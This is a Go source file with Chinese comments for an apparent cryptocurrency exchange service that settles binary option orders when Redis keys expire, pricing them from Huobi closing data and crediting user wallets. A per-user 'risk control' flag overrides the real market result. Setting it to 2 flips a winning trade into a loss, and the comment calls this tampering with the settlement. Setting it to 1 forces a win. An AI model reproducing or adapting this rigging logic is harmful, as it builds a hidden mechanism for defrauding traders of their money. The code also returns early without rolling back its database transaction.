package main

import (
	"errors"
	"fmt"
	cmap "github.com/orcaman/concurrent-map"
	"goapi/app/models"
	"goapi/app/response"
	"goapi/bootstrap"
	"goapi/config"
	conf "goapi/pkg/config"
	"goapi/pkg/helpers"
	"goapi/pkg/huobi"
	"goapi/pkg/logger"
	"goapi/pkg/mysql"
	"goapi/pkg/redis"
	"strconv"
	"strings"
	"sync"
)

// 期权合约服务

func init() {
	// 初始化配置信息
	config.Initialize()
	// 定义日志目录
	logger.Init("optionContractService")
	// 初始化 SQL
	bootstrap.SetupDB()
}

var wg sync.WaitGroup

func main() {
	db := conf.GetString("redis.db")
	logger.Info("期权合约服务初始化")
	//初始化 Redis
	bootstrap.SetupRedis(db)
	defer bootstrap.RedisClose()
	sub := redis.SubExpireEvent("__keyevent@" + db + "__:expired")
	logger.Info("期权合约服务已启动")
	for {
		msg := <-sub.Channel()
		logger.Info("msg.Payload")
		logger.Info(msg.Payload)
		logger.Info("msg.Payload")
		arr := strings.Split(msg.Payload, ":")
		// 期权合约交易订单
		if arr[0] == "option_contract" && arr[1] == "order" {
			id := arr[2]
			logger.Info(fmt.Sprintf("id: %v", id))
			wg.Add(1)
			go UpdateResult(id)
			wg.Wait()
			logger.Info(fmt.Sprintf("id over: %v", id))
		}
	}

}

func UpdateResult(id string) {
	defer wg.Done()
	var result response.OptionTransactionKline
	var OptionContractTransaction models.OptionContractTransaction
	DB := mysql.DB.Debug().Begin()
	DB.Model(OptionContractTransaction).
		Where(models.Prefix("$_option_contract_transaction.id"), id).
		Where(models.Prefix("$_option_contract_transaction.status"), "0").
		Joins(models.Prefix("left join $_currency on $_option_contract_transaction.currency_id=$_currency.id")).
		Select(models.Prefix("$_option_contract_transaction.*,$_currency.k_line_code")).
		Find(&result)
	if result.Id <= 0 {
		logger.Error(errors.New("订单不存在或者已经手动平仓"))
		return
	}
	if result.Status > 0 {
		logger.Error(errors.New("该订单已确认"))
		return
	}
	logger.Info(fmt.Sprintf("k线图代码: %v", result.KLineCode))
	clinchPrice, err1 := huobi.Kline(result.KLineCode, "close") // 获取本阶段收盘价
	Updates := cmap.New().Items()
	Updates["clinch_price"] = clinchPrice // 成交价格
	if err1 != nil {
		logger.Error(errors.New(fmt.Sprintf("获取本阶段收盘价失败: %v", err1.Error())))
		return
	}
	logger.Info(fmt.Sprintf("获取本阶段收盘价: %v", clinchPrice))
	BuyPrice, err2 := strconv.ParseFloat(result.BuyPrice, 64)
	if err2 != nil {
		logger.Error(errors.New(fmt.Sprintf("字符串转float64失败: %v", err2.Error())))
		return
	}
	resultProfit := -result.Price // 初始化默认盈利为亏了，亏的钱为订单的交易金额
	// 更新交割结果
	Updates["status"] = "1"
	Updates["result_profit"] = resultProfit
	// 计算交割结果
	// 涨：收盘价大于开盘价
	if clinchPrice > BuyPrice {
		logger.Info("clinchPrice > BuyPrice")
		logger.Info(fmt.Sprintf("%v > %v ：涨", clinchPrice, BuyPrice))
		Updates["order_result"] = "1"
	} else {
		logger.Info("clinchPrice <= BuyPrice")
		logger.Info(fmt.Sprintf("%v <= %v ：跌", clinchPrice, BuyPrice))
		// 跌：收盘价小于开盘价
		Updates["order_result"] = "2"
	}

	// 根据风控来交易，不看k线图结果
	var User response.User
	DB.Model(models.User{}).Where("id", result.UserId).Find(&User)

	// User.RiskProfit 风控 0-无 1-盈 2-亏  根据风控来交易，不看k线图结果   ||    购买结果和实际结果一样 盈利了
	// 盈利：本金+（本金*盈利率）-手续费 handle_fee
	if User.RiskProfit == 0 {
		logger.Info("该笔交易暂无风控干预")
		// 正常计算盈亏
		if result.OrderType == Updates["order_result"] {

			//Profit := result.Price + (result.Price * result.ProfitRatio / 100) - (result.Price * result.HandleFee / 100)
			Profit := (result.Price * result.ProfitRatio / 100) - (result.Price * result.HandleFee / 100)
			logger.Info(fmt.Sprintf("%v + (%v * %v) - (%v * %v)", result.Price, result.Price, result.ProfitRatio/100, result.Price, result.HandleFee/100))
			logger.Info(fmt.Sprintf("最终盈利 : %v", Profit))
			Updates["result_profit"] = Profit

			// 查询用户当前钱包余额
			where := cmap.New().Items()
			where["type"] = "2" // 查询合约钱包
			where["user_id"] = result.UserId
			where["trading_pair_id"] = result.TradingPairId
			var UsersWallet response.UsersWallet
			DB.Model(models.UsersWallet{}).Where(where).Find(&UsersWallet)
			// 查询用户当前钱包余额

			// 修改钱包余额
			UpdateUsersWallet := cmap.New().Items()
			UpdateUsersWallet["available"] = UsersWallet.Available + Profit
			editError := DB.Model(models.UsersWallet{}).Where(where).Updates(UpdateUsersWallet).Error
			if editError != nil {
				logger.Error(errors.New(fmt.Sprintf("修改钱包余额失败 : %v", editError.Error())))
				DB.Rollback()
				return
			}
			// 修改钱包余额

			// 创建钱包流水
			var data models.WalletStream
			data.Way = "1"                                                 // 流转方式 1 收入 2 支出
			data.Type = "7"                                                // 流转类型 0 未知 1 充值 2 提现 3 划转 4 快捷买币 5 空投 6 现货 7 合约 8 期权 9 手续费
			data.TypeDetail = "11"                                         // 流转详细类型 0 未知 1 USDT充值 2银行卡充值 3现货划转合约 4合约划转现货 5提现 6空投支出 7空投收入 8现货支出 9现货收入 10合约支出 11合约收入 12期权支出 13期权收入
			data.UserId = result.UserId                                    // 用户id
			data.Email = result.Email                                      // 用户邮箱
			data.TradingPairId = helpers.StringToInt(result.TradingPairId) // 交易对id
			data.TradingPairName = result.TradingPairName                  // 交易对名称
			data.Amount = fmt.Sprintf("%v", Profit)                        // 流转金额
			data.AmountBefore = UsersWallet.Available                      // 流转前的余额
			data.AmountAfter = Profit + UsersWallet.Available              // 流转后的余额
			cErr := DB.Model(models.WalletStream{}).Create(&data).Error
			if cErr != nil {
				logger.Error(errors.New(fmt.Sprintf("创建钱包流水失败 : %v", cErr.Error())))
				DB.Rollback()
				return
			}
			// 创建钱包流水

		}
	} else {
		logger.Info("User.RiskProfit 风控 0-无 1-盈 2-亏 根据风控来交易，不看k线图结果,当前用户的风控值：" + fmt.Sprintf("[  %v  ]", User.RiskProfit))

		if User.RiskProfit == 2 { // 根据风控概率直接让用户输，篡改交割结果改成和用户买的不一样
			logger.Info("风控干预为：亏")
			if result.OrderType == Updates["order_result"] {
				if result.OrderType == "1" { // 订单类型：1-买涨 2-买跌
					Updates["order_result"] = "2"
					logger.Info("当前用户买涨，干扰交割结果为跌")
				} else {
					Updates["order_result"] = "1"
					logger.Info("当前用户买跌，干扰交割结果为涨")
				}
				// 最终盈利
				Updates["result_profit"] = resultProfit
				logger.Info(fmt.Sprintf("风控盈利更新交割结果 : %v", Updates))
			}
		}

		if User.RiskProfit == 1 { // 干预为盈利
			if result.OrderType == "1" { // 订单类型：1-买涨 2-买跌
				Updates["order_result"] = "1"
				logger.Info("当前用户买涨，干扰交割结果为涨，让用户盈利")
			} else {
				Updates["order_result"] = "2"
				logger.Info("当前用户买跌，干扰交割结果为跌，让用户盈利")
			}
			//Profit := result.Price + (result.Price * result.ProfitRatio / 100) - (result.Price * result.HandleFee / 100)
			Profit := (result.Price * result.ProfitRatio / 100) - (result.Price * result.HandleFee / 100)
			logger.Info(fmt.Sprintf("%v + (%v * %v) - (%v * %v)", result.Price, result.Price, result.ProfitRatio/100, result.Price, result.HandleFee/100))
			logger.Info(fmt.Sprintf("最终盈利 : %v", Profit))
			Updates["result_profit"] = Profit
			logger.Info(fmt.Sprintf("风控盈利更新交割结果 : %v", Updates))

			// 查询用户当前钱包余额
			where := cmap.New().Items()
			where["type"] = "2" // 查询合约钱包
			where["user_id"] = result.UserId
			where["trading_pair_id"] = result.TradingPairId
			var UsersWallet response.UsersWallet
			DB.Model(models.UsersWallet{}).Where(where).Find(&UsersWallet)
			// 查询用户当前钱包余额

			// 修改钱包余额
			UpdateUsersWallet := cmap.New().Items()
			UpdateUsersWallet["available"] = UsersWallet.Available + Profit
			editError := DB.Model(models.UsersWallet{}).Where(where).Updates(UpdateUsersWallet).Error
			if editError != nil {
				logger.Error(errors.New(fmt.Sprintf("修改钱包余额失败 : %v", editError.Error())))
				DB.Rollback()
				return
			}
			// 修改钱包余额

			// 创建钱包流水
			var data models.WalletStream
			data.Way = "1"                                                 // 流转方式 1 收入 2 支出
			data.Type = "7"                                                // 流转类型 0 未知 1 充值 2 提现 3 划转 4 快捷买币 5 空投 6 现货 7 合约 8 期权 9 手续费
			data.TypeDetail = "11"                                         // 流转详细类型 0 未知 1 USDT充值 2银行卡充值 3现货划转合约 4合约划转现货 5提现 6空投支出 7空投收入 8现货支出 9现货收入 10合约支出 11合约收入 12期权支出 13期权收入
			data.UserId = result.UserId                                    // 用户id
			data.Email = result.Email                                      // 用户邮箱
			data.TradingPairId = helpers.StringToInt(result.TradingPairId) // 交易对id
			data.TradingPairName = result.TradingPairName                  // 交易对名称
			data.Amount = fmt.Sprintf("%v", Profit)                        // 流转金额
			data.AmountBefore = UsersWallet.Available                      // 流转前的余额
			data.AmountAfter = Profit + UsersWallet.Available              // 流转后的余额
			cErr := DB.Model(models.WalletStream{}).Create(&data).Error
			if cErr != nil {
				logger.Error(errors.New(fmt.Sprintf("创建钱包流水失败 : %v", cErr.Error())))
				DB.Rollback()
				return
			}
			// 创建钱包流水
		}

	}

	err3 := DB.Model(OptionContractTransaction).Where("id", id).Updates(Updates).Error
	if err3 != nil {
		logger.Error(errors.New(fmt.Sprintf("更新交割结果失败 : %v", err3.Error())))
		DB.Rollback()
	}
	DB.Commit()
}
